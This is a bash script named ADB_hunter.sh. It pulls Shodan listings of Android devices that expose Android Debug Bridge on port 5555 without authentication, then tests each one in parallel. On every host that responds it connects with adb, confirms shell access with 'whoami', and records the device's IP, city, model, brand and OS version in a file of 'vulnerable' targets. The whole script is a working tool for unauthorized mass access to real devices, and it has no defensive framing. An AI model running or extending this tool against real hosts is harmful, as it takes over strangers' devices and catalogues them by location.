#!/bin/bash

# ==============================================================================
# Script Name: ADB_hunter.sh
# Description: Download shodan search result of possible ADB vulnerable devices.
# Version: 1.0.0
# Author: mind2hex
# Date: 2024-05-21
# License: GPLv3
# ==============================================================================

# Exit immediately if a command exits with a non-zero status
set -e

# Treat unset variables as an error when substituting
set -u

# Print each command before executing it (useful for debugging)
# set -x

# Function to show help
show_help() {
    echo "Usage: $0 [options]"
    echo
    echo "Options:"
    echo "  -h, --help          Show this help message and exit"
    echo "  -v, --version       Show script version and exit"
    echo "  -t, --target        Specify a single target instead of test targets from shodan"
    echo "  -s, --save          Dont delete result file (vulnerable_targets.txt)"
    echo
    exit 0
}

# Function to show version
show_version() {
    echo "$0 version 1.0.0"
    exit 0
}

# Function to check dependencies
check_dependencies() {
    local dependencies=("shodan" "adb" "parallel" "nc")
    for cmd in "${dependencies[@]}"; do
        if ! command -v "$cmd" &> /dev/null; then
            echo "Error: $cmd is not installed." >&2
            exit 1
        fi
    done
}

# Function to handle errors
error_exit() {
    echo "Error: $1" >&2
    exit 1
}

# Parse command-line arguments
parse_args(){
    output_file=""
    while [[ $# -gt 0 ]]; do
        case $1 in
            -h|--help)
                show_help
                ;;
            -v|--version)
                show_version
                ;;
            -t|--target)
                if [[ -n "${2-}" && $2 != -* ]];then
                    adb_targets=( $2 )
                    shift
                else
                    error_exit "Argument for $1 is missing"
                fi
                ;;
            -s|--save)
                save_file=true
                ;;
            *)
                error_exit "Unknown option: $1"
                ;;
        esac
        shift
    done
}

# Download all possible targets using shodan
download_targets(){
    echo "[!] Downloading targets from shodan"
    shodan_file="shodan_result"
    if [[ ! (-e "${shodan_file}.json.gz") ]]; then
        shodan download ${shodan_file} 'Android Debug Bridge port:5555 !("Authentication is required")' 
    fi 
}

# Function to test a single target
test_single_target() {
    local target="$1"
    echo -n "[!] Testing ${target} "
    local target_ip=$(   echo -n "${target}" | cut -d ":" -f 1  )
    local target_city=$( echo -n "${target}" | cut -d ":" -f 2 | tr -cd '\11\12\15\40-\176' )
    if [[ $target_city = $target_ip ]];then
        target_city="UNK"
    fi
    
    # Testing that the IP is responding to ping
    if ping -w 3 -c 1 $target_ip &> /dev/null; then
        # Testing that the port 5555 is receiving connections
        if nc -nzv -w 3 $target_ip 5555 &> /dev/null; then
            if [[ -z $(adb connect $target_ip | grep -o "failed") ]]; then
                if [[ -z $(adb -s $target_ip shell whoami 2>&1 | grep -o -E "(Permission denied|error:|device offline|killed|inaccessible or not found)" ) ]];then
                    echo -e "[\e[31mVULNERABLE\e[0m] (respond to ICMP) (port 5555 is open) (adb connection successful and shell access)"
                    
                    local getprop_output=$( adb -s $target_ip shell getprop )
                    local target_model=$(   echo "$getprop_output" | grep -m 1 "ro.product.model"         | cut -d ":" -f 2 | tr -d "\n\r " | tr -cd '\11\12\15\40-\176' )
                    local target_name=$(    echo "$getprop_output" | grep -m 1 "ro.product.name"          | cut -d ":" -f 2 | tr -d "\n\r " | tr -cd '\11\12\15\40-\176' )
                    local target_brand=$(   echo "$getprop_output" | grep -m 1 "ro.product.brand"         | cut -d ":" -f 2 | tr -d "\n\r " | tr -cd '\11\12\15\40-\176' )
                    local target_release=$( echo "$getprop_output" | grep -m 1 "ro.build.version.release" | cut -d ":" -f 2 | tr -d "\n\r " | tr -cd '\11\12\15\40-\176' )
                    local target_sdk=$(     echo "$getprop_output" | grep -m 1 "ro.build.version.sdk"     | cut -d ":" -f 2 | tr -d "\n\r " | tr -cd '\11\12\15\40-\176' )
                    echo "$target_ip:$target_city:$target_model:$target_name:$target_brand:$target_release:$target_sdk" >> vulnerable_targets.txt
                    adb disconnect $target_ip > /dev/null
                else
                    echo "[NOT VULNERABLE] adb accepting connections but no shell access"
                fi
            else
                echo "[NOT VULNERABLE] adb connection failed"
            fi 
        else
            echo "[NOT VULNERABLE] port 5555 is closed."
        fi
    else
        echo "[NOT VULNERABLE] doesn't respond to ICMP."
    fi
}

# Main logic of the script
main() {
    # Check for required dependencies
    check_dependencies

    # Parse arguments
    parse_args "$@"

    if ! (declare -p adb_targets 2>/dev/null);then 
        # Download targets
        download_targets

        echo "========================================="
        echo "[!] Press CTRL + C to finish recollection"
        echo "========================================="
        sleep 2

        keep_running=true
        handle_sigint() {
            echo "[!] Finishing testing..."
            keep_running=false
            adb disconnect > /dev/null 2>&1
        }
        trap handle_sigint SIGINT

        
        export keep_running
        
        # Extract targets and run tests in parallel
        adb_targets=( $(shodan parse --fields ip_str,location.city shodan_result.json.gz --separator ":" | tr " " "_" ) ) 
    fi
    export -f test_single_target
    parallel --halt soon,fail=1 -j 40 test_single_target ::: "${adb_targets[@]}" || true
    
    sleep 3

    # Collect results
    if [[ -f vulnerable_targets.txt ]]; then
        mapfile -t vulnerable_targets < vulnerable_targets.txt
        if ! (declare -p save_file 2>/dev/null);then
            rm -f vulnerable_targets.txt
        fi
    else
        vulnerable_targets=()
    fi

    # Display results
    clear
    echo "  IP ADDRESS         CITY          MODEL       NAME       BRAND     VERSION    SDK     "     
    echo " --------------- --------------- ---------- ---------- ---------- ---------- ----------"
    for target in "${vulnerable_targets[@]}"; do
        target_ip=$(      echo $target | cut -d ":" -f 1 )
        target_city=$(    echo $target | cut -d ":" -f 2 )
        target_model=$(   echo $target | cut -d ":" -f 3 )
        target_name=$(    echo $target | cut -d ":" -f 4 )
        target_brand=$(   echo $target | cut -d ":" -f 5 )
        target_release=$( echo $target | cut -d ":" -f 6 )
        target_sdk=$(     echo $target | cut -d ":" -f 7 )
        printf " %-15s %-15s %-10s %-10s %-10s %-10s %-10s\n" \
        $target_ip ${target_city:0:15} ${target_model:0:10} ${target_name:0:10} ${target_brand:0:10} ${target_release:0:10} ${target_sdk:0:10}
    done
    echo " --------------- --------------- ---------- ---------- ---------- ---------- ----------"
}

# Run the main function
main "$@"
exit 0
# End of script
